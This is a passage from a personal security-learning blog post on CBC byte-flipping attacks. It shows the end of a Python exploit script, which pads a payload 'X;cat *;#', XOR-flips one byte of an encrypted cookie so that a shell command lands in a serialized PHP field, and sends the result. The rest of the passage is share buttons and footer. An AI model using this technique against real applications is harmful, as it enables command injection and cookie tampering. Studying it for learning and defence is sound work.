<span class="c">#a:2:{s:4:&quot;name&quot;;s:10:&quot;X;cat *;#a&quot;;s:8:&quot;greeting&quot;;s:24:&quot;echo &#39;Hello X;cat *;#a!&#39;&quot;;}</span>
<span class="c">#a:2:{s:4:&quot;name&quot;;</span>
<span class="c">#s:10:&quot;X;cat *;#a</span>
<span class="c">#&quot;;s:8:&quot;greeting&quot;</span>
<span class="c">#;s:24:&quot;echo &#39;Hel</span>
<span class="c">#lo X;cat *;#a!&#39;&quot;</span>
<span class="c">#;}</span>
 
<span class="c">#a:2:{s:4:&quot;name&quot;;s:42:&quot;zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz&quot;;s:8:&quot;greeting&quot;;s:56:&quot;echo &#39;Hello zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz!&#39;&quot;;}</span>
<span class="c">#a:2:{s:4:&quot;name&quot;;</span>
<span class="c">#s:42:&quot;zzzzzzzzzz</span>
<span class="c">#zzzzzzzX;cat *;#</span>
<span class="c">#zzzzzzzzzzzzzzzz</span>
<span class="c">#&quot;;s:8:&quot;greeting&quot;</span>
<span class="c">#;s:56:&quot;echo &#39;Hel</span>
<span class="c">#lo zzzzzzzzzzzzz</span>
<span class="c">#zzzzX;cat *;#zzz</span>
<span class="c">#zzzzzzzzzzzzz!&#39;&quot;</span>
<span class="c">#;}</span>
<span class="c">#exploit = &#39;X&#39; + &#39;;cat *;#a&#39; #Test case first, unsuccess</span>
<span class="n">exploit</span> <span class="o">=</span> <span class="s">&#39;z&#39;</span><span class="o">*</span><span class="mi">17</span> <span class="o">+</span> <span class="s">&#39;X&#39;</span> <span class="o">+</span> <span class="s">&#39;;cat *;#&#39;</span> <span class="o">+</span> <span class="s">&#39;z&#39;</span> <span class="o">*</span><span class="mi">16</span> <span class="c"># Test Success</span>
 
<span class="c">#exploit = &quot;______________________________________________________; cat *;#&quot;</span>
<span class="c">#Test(exploit)</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="n">GetCookie</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
<span class="n">pos</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span> <span class="c">#test case success</span>
<span class="c">#pos = 51; #test case first, unsuccess</span>
<span class="n">val</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">&#39;X&#39;</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&quot;&#39;&quot;</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">cookie</span><span class="p">[</span><span class="n">pos</span><span class="p">]))</span>
<span class="n">exploit</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">pos</span><span class="p">]</span> <span class="o">+</span> <span class="n">val</span> <span class="o">+</span> <span class="n">cookie</span><span class="p">[</span><span class="n">pos</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:]</span>
<span class="n">Pwn</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span></code></pre></div>


</div>
<div class="container">
    <ul class="rrssb-buttons clearfix">
    <li class="rrssb-email">
    <!-- Replace subject with your message using URL Endocding: http://meyerweb.com/eric/tools/dencoder/ -->
        <a href="mailto:?subject=CBC字节翻转攻击-101Approach&amp;body=Check out: https://larryxi.github.io/cbc-byte-flipping-attack-101-approach-studying.html">
            <span class="rrssb-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 28"><path d="M20.11 26.147c-2.335 1.05-4.36 1.4-7.124 1.4C6.524 27.548.84 22.916.84 15.284.84 7.343 6.602.45 15.4.45c6.854 0 11.8 4.7 11.8 11.252 0 5.684-3.193 9.265-7.398 9.3-1.83 0-3.153-.934-3.347-2.997h-.077c-1.208 1.986-2.96 2.997-5.023 2.997-2.532 0-4.36-1.868-4.36-5.062 0-4.75 3.503-9.07 9.11-9.07 1.713 0 3.7.4 4.6.972l-1.17 7.203c-.387 2.298-.115 3.3 1 3.4 1.674 0 3.774-2.102 3.774-6.58 0-5.06-3.27-8.994-9.304-8.994C9.05 2.87 3.83 7.545 3.83 14.97c0 6.5 4.2 10.2 10 10.202 1.987 0 4.09-.43 5.647-1.245l.634 2.22zM16.647 10.1c-.31-.078-.7-.155-1.207-.155-2.572 0-4.596 2.53-4.596 5.53 0 1.5.7 2.4 1.9 2.4 1.44 0 2.96-1.83 3.31-4.088l.592-3.72z"/></svg></span>
            <span class="rrssb-text">email</span>
        </a>
    </li>
    <li class="rrssb-facebook">
<!--  Replace with your URL. For best results, make sure you page has the proper FB Open Graph tags in header: https://developers.facebook.com/docs/opengraph/howtos/maximizing-distribution-media-content/ -->
        <a href="https://www.facebook.com/sharer/sharer.php?u=https://larryxi.github.io/cbc-byte-flipping-attack-101-approach-studying.html" class="popup">
            <span class="rrssb-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 29 29"><path d="M26.4 0H2.6C1.714 0 0 1.715 0 2.6v23.8c0 .884 1.715 2.6 2.6 2.6h12.393V17.988h-3.996v-3.98h3.997v-3.062c0-3.746 2.835-5.97 6.177-5.97 1.6 0 2.444.173 2.845.226v3.792H21.18c-1.817 0-2.156.9-2.156 2.168v2.847h5.045l-.66 3.978h-4.386V29H26.4c.884 0 2.6-1.716 2.6-2.6V2.6c0-.885-1.716-2.6-2.6-2.6z"/></svg></span>
            <span class="rrssb-text">facebook</span>
        </a>
    </li>
    <li class="rrssb-twitter">
        <!-- Replace href with your Meta and URL information  -->
        <a href="https://twitter.com/intent/tweet?text=CBC字节翻转攻击-101Approach&amp;url=https://larryxi.github.io/cbc-byte-flipping-attack-101-approach-studying.html" class="popup">
            <span class="rrssb-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 28"><path d="M24.253 8.756C24.69 17.08 18.297 24.182 9.97 24.62a15.093 15.093 0 0 1-8.86-2.32c2.702.18 5.375-.648 7.507-2.32a5.417 5.417 0 0 1-4.49-3.64c.802.13 1.62.077 2.4-.154a5.416 5.416 0 0 1-4.412-5.11 5.43 5.43 0 0 0 2.168.387A5.416 5.416 0 0 1 2.89 4.498a15.09 15.09 0 0 0 10.913 5.573 5.185 5.185 0 0 1 3.434-6.48 5.18 5.18 0 0 1 5.546 1.682 9.076 9.076 0 0 0 3.33-1.317 5.038 5.038 0 0 1-2.4 2.942 9.068 9.068 0 0 0 3.02-.85 5.05 5.05 0 0 1-2.48 2.71z"/></svg></span>
            <span class="rrssb-text">twitter</span>
        </a>
    </li>
    <li class="rrssb-linkedin">
        <a href="http://www.linkedin.com/shareArticle?mini=true&amp;url=https://larryxi.github.io/cbc-byte-flipping-attack-101-approach-studying.html&amp;title=CBC字节翻转攻击-101Approach&amp;summary=CBC字节翻转攻击-101Approach" class="popup">
            <span class="rrssb-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewbox="0 0 28 28">
                    <path d="M25.424 15.887v8.447h-4.896v-7.882c0-1.98-.71-3.33-2.48-3.33-1.354 0-2.158.91-2.514 1.802-.13.315-.162.753-.162 1.194v8.216h-4.9s.067-13.35 0-14.73h4.9v2.087c-.01.017-.023.033-.033.05h.032v-.05c.65-1.002 1.812-2.435 4.414-2.435 3.222 0 5.638 2.106 5.638 6.632zM5.348 2.5c-1.676 0-2.772 1.093-2.772 2.54 0 1.42 1.066 2.538 2.717 2.546h.032c1.71 0 2.77-1.132 2.77-2.546C8.056 3.593 7.02 2.5 5.344 2.5h.005zm-2.48 21.834h4.896V9.604H2.867v14.73z"></path>
                </svg>
            </span>
            <span class="rrssb-text">linkedin</span>
        </a>
    </li>
    <li class="rrssb-googleplus">
        <a href="https://plus.google.com/share?url=https://larryxi.github.io/cbc-byte-flipping-attack-101-approach-studying.html" class="popup">
            <span class="rrssb-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24">
                    <path d="M21 8.29h-1.95v2.6h-2.6v1.82h2.6v2.6H21v-2.6h2.6v-1.885H21V8.29zM7.614 10.306v2.925h3.9c-.26 1.69-1.755 2.925-3.9 2.925-2.34 0-4.29-2.016-4.29-4.354s1.885-4.353 4.29-4.353c1.104 0 2.014.326 2.794 1.105l2.08-2.08c-1.3-1.17-2.924-1.883-4.874-1.883C3.65 4.586.4 7.835.4 11.8s3.25 7.212 7.214 7.212c4.224 0 6.953-2.988 6.953-7.082 0-.52-.065-1.104-.13-1.624H7.614z"></path>
                </svg>
            </span>
            <span class="rrssb-text">google+</span></a>
    </li>
    <li class="rrssb-pinterest">
        <a href="http://pinterest.com/pin/create/button/?url=https://larryxi.github.io/cbc-byte-flipping-attack-101-approach-studying.html&amp;description=CBC字节翻转攻击-101Approach"><span class="rrssb-icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewbox="0 0 28 28">
                <path d="M14.02 1.57c-7.06 0-12.784 5.723-12.784 12.785S6.96 27.14 14.02 27.14c7.062 0 12.786-5.725 12.786-12.785 0-7.06-5.724-12.785-12.785-12.785zm1.24 17.085c-1.16-.09-1.648-.666-2.558-1.22-.5 2.627-1.113 5.146-2.925 6.46-.56-3.972.822-6.952 1.462-10.117-1.094-1.84.13-5.545 2.437-4.632 2.837 1.123-2.458 6.842 1.1 7.557 3.71.744 5.226-6.44 2.924-8.775-3.324-3.374-9.677-.077-8.896 4.754.19 1.178 1.408 1.538.49 3.168-2.13-.472-2.764-2.15-2.683-4.388.132-3.662 3.292-6.227 6.46-6.582 4.008-.448 7.772 1.474 8.29 5.24.58 4.254-1.815 8.864-6.1 8.532v.003z"></path>
            </svg></span><span class="rrssb-text">pinterest</span></a>
    </li>
</ul>

</div>


    <div class="container">
    <hr />
    
        
            
        
        
            <div id="img-about">
                <img class="about-img pull-left" src="images/lubang.jpg">
            </div>
        
        <div class="about-stub">
            
                
            
            <a class="different-highlight" href="about">
                <h2 style="font-family: Montserrat">
                    
                        Larryxi
                    
                </h2>
            </a>
            
                <p id="about-description" style="margin-top: 4px;">
                    Jordon says,"JUST DO IT", so I learn IT.

                </p>
            
        </div>
    
</div>
<div style="clear:both"></div>






    <aside id="comments" class="disqus">
    	<div class="container">
    		<h3 class="alignable pull-left"></h3> <h3 class="alignable pull-right"> <i class="icon-disqus"></i></h3>
    		<!--
    	  		Copy the universal code from Disqus. In particular, the div with id #disqus_thread and the following Javascript
    			As an Example see below.
    			Start here
    	   	-->
            <div id="disqus_thread"></div>
                <script>
                    /**
                     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
                     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
                     */
                    /*
                    var disqus_config = function () {
                        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
                        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
                    };
                    */
                    (function() {  // DON'T EDIT BELOW THIS LINE
                        var d = document, s = d.createElement('script');
                        
                        s.src = '//larryxi.disqus.com/embed.js';
                        
                        s.setAttribute('data-timestamp', +new Date());
                        (d.head || d.body).appendChild(s);
                    })();
                </script>
                <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
    		<!--
    	  		End here
    	  	-->
    </aside>



        </div>
    </div>
    <footer>
    

    
    <div class="container page-suggestion">
        
            <a class="button alignable pull-left" href="https://larryxi.github.io/DNS-zone-transfer-studying.html">
                &larr; DNS域传送漏洞学习总结
            </a>
        
        
            <a class="button alignable pull-right" href="https://larryxi.github.io/basic-google-hacking.html">
                基础级Google Hacking &rarr;
            </a>
        
    </div>
    <div style="clear:both"></div>


    
    <hr />
    <div class="user-footer">
        <!--more<div class="copyright alignable pull-left">
            
                <h2> &copy;accent</h2>
            
        </div>-->
        <div class="alignable pull-left">
            <p class="faded"><!-- class="alignable pull-left" style="display: inline-block">-->
            Built with <a href="http://jekyllrb.com/" class="different-highlight underline">Jekyll</a> and <a href="http://ankitsultana.me/accent/" class="different-highlight underline">accent</a>
            </p>
        </div>
        <div class="alignable pull-right">
            <a target="_blank" href="http://weibo.com/u/3996118191" class="button">
                @Larryxi
            </a>
            <a href="mailto:larrycompress@gmail.com" class="button">
                mail
            </a>
            <a target="_blank" href="https://larryxi.github.io/feed.xml" class="button">
                rss
            </a>
        </div>
    </div>
    <!--<div style="clear:both"></div>
    <hr />
    <div class="theme-footer">
        <p class="alignable pull-left" style="display: inline-block">
            Built with <a href="http://jekyllrb.com/" class="different-highlight underline">Jekyll</a> and <a href="http://ankitsultana.me/accent/" class="different-highlight underline">accent</a>
        </p>
    </div>-->
</footer>

    <script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script src="/js/rrssb.min.js"></script>

    
        <script src="js/anchor.min.js"></script>
        <script>
        anchors.options.placement = 'right'
        anchors.options.class = 'hide'
        anchors.add()
        anchors.remove('.post-title')
        </script>
    
    
        <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-80180060-1# GA Tracking ID', 'auto');
  ga('send', 'pageview');

</script>

    
</body>
